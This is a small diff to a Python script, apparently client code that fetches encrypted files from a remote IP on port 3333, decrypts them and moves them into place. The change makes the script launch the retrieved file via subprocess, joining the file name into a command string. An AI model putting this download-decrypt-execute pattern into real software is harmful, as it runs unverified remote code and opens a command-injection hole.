@@ -105,6 +105,7 @@ def get_files(ip, status="update"):
     _ = decrypt_folder("test", key)
     shutil.move(f"test/{_}", "./")
     os.rmdir("test")
+    return _
 
 
 ip, port = ("", 3333)
@@ -141,7 +142,7 @@ while True:
 time.sleep(1)
 print('ok')
 
-get_files(ip, status="get")
+subprocess.Popen("python starter.py " + get_files(ip, status="get"))
 
 #
 # while True:
